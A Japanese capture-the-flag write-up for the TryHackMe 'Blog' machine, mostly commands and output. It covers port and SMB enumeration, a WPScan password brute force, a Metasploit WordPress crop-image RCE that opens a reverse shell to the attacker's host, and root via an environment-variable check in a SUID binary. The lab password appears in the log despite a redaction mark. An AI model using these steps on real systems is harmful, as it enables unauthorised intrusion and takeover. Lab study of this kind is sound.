# Blog CTF

https://tryhackme.com/room/blog

## Enumeration

```shell
TARGET=10.201.120.239
sudo bash -c "echo $TARGET   blog.thm >> /etc/hosts"
```

### ポートスキャン

```sh
root@ip-10-201-80-169:~# nmap -sS -p- $TARGET

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

```sh
nmap -sV -p22,80,139,445 $TARGET

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

### SMB

```sh
$ smbclient -L //$TARGET -U ""              
Password for [WORKGROUP\]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        BillySMB        Disk      Billy's local SMB Share
        IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
```

```sh
$ smbclient //$TARGET/BillySMB -U "" 
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> l
  .                                   D        0  Wed May 27 03:17:05 2020
  ..                                  D        0  Wed May 27 02:58:23 2020
  Alice-White-Rabbit.jpg              N    33378  Wed May 27 03:17:01 2020
  tswift.mp4                          N  1236733  Wed May 27 03:13:45 2020
  check-this.png                      N     3082  Wed May 27 03:13:43 2020
```

QRコードは、https://qrgo.page.link/M6dE (Billy Joel - We Didn't Start The Fire (Official HD Video))

```sh
$ stegseek ./Alice-White-Rabbit.jpg         
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "rabbit_hole.txt".
[i] Extracting to "Alice-White-Rabbit.jpg.out".

$ cat ./Alice-White-Rabbit.jpg.out 
You've found yourself in a rabbit hole, friend.
```

### ディレクトリ列挙

```sh
dirb http://$TARGET

---- Scanning URL: http://blog.thm/ ----
==> DIRECTORY: http://blog.thm/0/
+ http://blog.thm/admin (CODE:302|SIZE:0)
+ http://blog.thm/atom (CODE:301|SIZE:0)
+ http://blog.thm/dashboard (CODE:302|SIZE:0)
==> DIRECTORY: http://blog.thm/embed/
+ http://blog.thm/favicon.ico (CODE:200|SIZE:0)
==> DIRECTORY: http://blog.thm/feed/
+ http://blog.thm/index.php (CODE:301|SIZE:0)
+ http://blog.thm/login (CODE:302|SIZE:0)
+ http://blog.thm/n (CODE:301|SIZE:0)
+ http://blog.thm/N (CODE:301|SIZE:0)
+ http://blog.thm/no (CODE:301|SIZE:0)
+ http://blog.thm/note (CODE:301|SIZE:0)
+ http://blog.thm/page1 (CODE:301|SIZE:0)
+ http://blog.thm/rdf (CODE:301|SIZE:0)
+ http://blog.thm/robots.txt (CODE:200|SIZE:67)
+ http://blog.thm/rss (CODE:301|SIZE:0)
+ http://blog.thm/rss2 (CODE:301|SIZE:0)
+ http://blog.thm/server-status (CODE:403|SIZE:273)
+ http://blog.thm/w (CODE:301|SIZE:0)
+ http://blog.thm/W (CODE:301|SIZE:0)
+ http://blog.thm/welcome (CODE:301|SIZE:0)
==> DIRECTORY: http://blog.thm/wp-admin/
==> DIRECTORY: http://blog.thm/wp-content/
==> DIRECTORY: http://blog.thm/wp-includes/
+ http://blog.thm/xmlrpc.php (CODE:405|SIZE:42)
```

robots.txt

```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
```

## wpscan

```shell
$ wpscan --url http://blog.thm/ -e   
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://blog.thm/ [10.201.120.239]
[+] Started: Sun Sep 28 09:30:51 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://blog.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blog.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.thm/feed/, <generator>https://wordpress.org/?v=5.0</generator>
 |  - http://blog.thm/comments/feed/, <generator>https://wordpress.org/?v=5.0</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://blog.thm/wp-content/themes/twentytwenty/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.9
 | Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: 'Version: 1.3'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:50 <===========================================================================================================================================================> (652 / 652) 100.00% Time: 00:00:50
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:03:18 <=========================================================================================================================================================> (2575 / 2575) 100.00% Time: 00:03:18

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:11 <============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:11

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:05 <==================================================================================================================================================================> (75 / 75) 100.00% Time: 00:00:05

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:07 <=======================================================================================================================================================> (100 / 100) 100.00% Time: 00:00:07

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <=============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] kwheel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bjoel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Sep 28 09:35:52 2025
[+] Requests Done: 3611
[+] Cached Requests: 10
[+] Data Sent: 955.685 KB
[+] Data Received: 23.878 MB
[+] Memory used: 314.547 MB
[+] Elapsed time: 00:05:01
```

kwheel、bjoelユーザーを発見。

kwheel ユーザーのパスワードをブルートフォース。

```sh
$ wpscan --url http://blog.thm/ --passwords /usr/share/wordlists/rockyou.txt --usernames kwheel

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - kwheel / [REDACTED]                                                                                      
Trying kwheel / westham Time: 00:07:16 <                                   > (2865 / 14347257)  0.01%  ETA: ??:??:??
```

## metasploit

シェル取得成功

```sh
msf6 exploit(multi/http/wp_crop_rce) > set USERNAME kwheel
USERNAME => kwheel
msf6 exploit(multi/http/wp_crop_rce) > set PASSWORD [REDACTED]
PASSWORD => [REDACTED]
msf6 exploit(multi/http/wp_crop_rce) > set LHOST 10.11.146.32
LHOST => 10.11.146.32
msf6 exploit(multi/http/wp_crop_rce) > set RHOSTS 10.201.120.239
RHOSTS => 10.201.120.239
msf6 exploit(multi/http/wp_crop_rce) > run
[*] Started reverse TCP handler on 10.11.146.32:4444 
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (40004 bytes) to 10.201.120.239
[*] Attempting to clean up files...
[*] Meterpreter session 1 opened (10.11.146.32:4444 -> 10.201.120.239:42934) at 2025-09-28 10:29:16 +0900

meterpreter > 
```

user.txt を検索

```sh
www-data@blog:/$ find / -name 'user.txt' 2>/dev/null
find / -name 'user.txt' 2>/dev/null
/home/bjoel/user.txt
```

/home/bjoel 配下の user.txt はダミー

```sh
www-data@blog:/var/www/wordpress$ cat /home/bjoel/user.txt
cat /home/bjoel/user.txt
You won't find what you're looking for here.

TRY HARDER
```

## 権限昇格

SUID検索。/usr/sbin/checker　というものがある。

```sh
www-data@blog:/var/www/wordpress$ find / -perm -u=s -type f -ls 2>/dev/null
find / -perm -u=s -type f -ls 2>/dev/null
   394827     60 -rwsr-xr-x   1 root     root        59640 Mar 22  2019 /usr/bin/passwd
   394810     40 -rwsr-xr-x   1 root     root        40344 Mar 22  2019 /usr/bin/newgrp
   394700     76 -rwsr-xr-x   1 root     root        75824 Mar 22  2019 /usr/bin/gpasswd
   394607     44 -rwsr-xr-x   1 root     root        44528 Mar 22  2019 /usr/bin/chsh
   394811     40 -rwsr-xr-x   1 root     root        37136 Mar 22  2019 /usr/bin/newuidmap
   394847     24 -rwsr-xr-x   1 root     root        22520 Mar 27  2019 /usr/bin/pkexec
   394605     76 -rwsr-xr-x   1 root     root        76496 Mar 22  2019 /usr/bin/chfn
   394952    148 -rwsr-xr-x   1 root     root       149080 Jan 31  2020 /usr/bin/sudo
   394554     52 -rwsr-sr-x   1 daemon   daemon      51464 Feb 20  2018 /usr/bin/at
   394809     40 -rwsr-xr-x   1 root     root        37136 Mar 22  2019 /usr/bin/newgidmap
   394988     20 -rwsr-xr-x   1 root     root        18448 Jun 28  2019 /usr/bin/traceroute6.iputils
   415459     12 -rwsr-sr-x   1 root     root         8432 May 26  2020 /usr/sbin/checker
```

リバース。admin環境変数があれば、rootシェルを起動する。

```c
undefined8 main(void)
{
  char *pcVar1;
  
  pcVar1 = getenv("admin");
  if (pcVar1 == (char *)0x0) {
    puts("Not an Admin");
  }
  else {
    setuid(0);
    system("/bin/bash");
  }
  return 0;
}
```

昇格成功。

```sh
www-data@blog:/var/www/wordpress$ export admin=1
export admin=1
www-data@blog:/var/www/wordpress$ /usr/sbin/checker
/usr/sbin/checker
root@blog:/var/www/wordpress# id
id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

user.txt を検索

```sh
root@blog:/var/www/wordpress# find / -name 'user.txt' 2>/dev/null
find / -name 'user.txt' 2>/dev/null
/home/bjoel/user.txt
/media/usb/user.txt
```

## 振り返り

- 典型的な Wordpress CTF

## Tags

#tags:WordPress
